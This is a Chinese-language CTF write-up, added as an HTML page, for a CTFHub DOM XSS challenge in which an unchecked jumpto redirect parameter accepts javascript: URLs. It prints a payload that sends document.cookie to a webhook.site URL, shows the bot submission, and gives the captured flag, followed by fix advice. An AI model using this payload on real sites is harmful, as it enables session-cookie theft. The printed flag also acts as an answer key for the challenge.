@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub XSS DOM JumpTo Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; word-break: break-all; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; white-space: pre-wrap; word-break: break-all; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - XSS - DOM JumpTo ?</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># XSS</span>
+            <span class="tag"># DOM JumpTo</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>XSS DOM JumpTo ?</li>
+            <li><strong>题目方向：</strong>Web - XSS - DOM 跳转</li>
+            <li><strong>题目目标：</strong>利用 <code>jumpto</code> 参数控制页面跳转，在 Bot 上下文中执行 JavaScript 并外带 Cookie。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>首页内联脚本直接读取 URL 查询参数，并将参数值赋给 <code>location.href</code>：</p>
+        <pre>var target = location.search.split("=")
+if (target[0].slice(1) == "jumpto") {
+    location.href = target[1];
+}</pre>
+        <p>代码没有校验跳转协议。将 <code>jumpto</code> 设置为 <code>javascript:</code> URL 后，浏览器会在当前页面上下文执行脚本，形成 DOM XSS。</p>
+        <p>需要注意两点：第一，参数通过 <code>split("=")</code> 截取，Payload 中不能出现原始 <code>=</code>，否则会被截断；第二，必须保留 <code>javascript:</code> 中的冒号，若将整个 Payload 百分号编码，赋值时就无法识别为 JavaScript 协议。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>确认 DOM 跳转：</strong>访问 <code>/?jumpto=https://example.com/</code>，页面会跳转到指定地址。
+            </li>
+            <li>
+                <strong>构造无等号外带 Payload：</strong>使用 <code>fetch</code> 请求 Webhook，并把 <code>document.cookie</code> 编码后拼到路径中。Payload 不包含原始 <code>=</code>，因此不会被 <code>split("=")</code> 截断。
+                <pre>javascript:fetch('https://webhook.site/&lt;token&gt;/x/'+encodeURIComponent(document.cookie))</pre>
+            </li>
+            <li>
+                <strong>提交给 Bot：</strong>把目标地址和 Payload 拼接后，向 <code>/submit</code> 发送 JSON。
+                <pre>&#36;hostUrl = "http://challenge-xxx.sandbox.ctfhub.com:10800/"
+&#36;js = "javascript:fetch('https://webhook.site/&lt;token&gt;/x/'+encodeURIComponent(document.cookie))"
+&#36;target = &#36;hostUrl + "?jumpto=" + &#36;js
+
+POST /submit
+Content-Type: application/json
+
+{"url":"http://challenge-xxx.sandbox.ctfhub.com:10800/?jumpto=javascript:fetch(...)"}</pre>
+                接口返回：
+                <pre>{"code":0,"msg":"Successfully"}</pre>
+            </li>
+            <li>
+                <strong>读取回连数据：</strong>HeadlessChrome 访问目标地址后执行跳转脚本，Webhook 收到：
+                <pre>GET /x/flag%3Dctfhub%7Bf2123f8d15d4c2b24e0b37fd%7D%7C%7B%7D</pre>
+                URL 解码后得到 <code>flag=ctfhub{f2123f8d15d4c2b24e0b37fd}|{}</code>。
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{f2123f8d15d4c2b24e0b37fd}
+        </div>
+
+        <h2>五、修复建议</h2>
+        <ul>
+            <li>跳转前使用 <code>new URL()</code> 解析目标地址，并限制协议为 <code>http:</code> 或 <code>https:</code>。</li>
+            <li>禁止把用户输入直接赋给 <code>location.href</code>、<code>location.assign()</code> 等跳转入口。</li>
+            <li>敏感 Cookie 设置 <code>HttpOnly</code>，并配置 CSP 限制未授权脚本和外部数据发送。</li>
+        </ul>
+    </div>
+</body>
+</html>
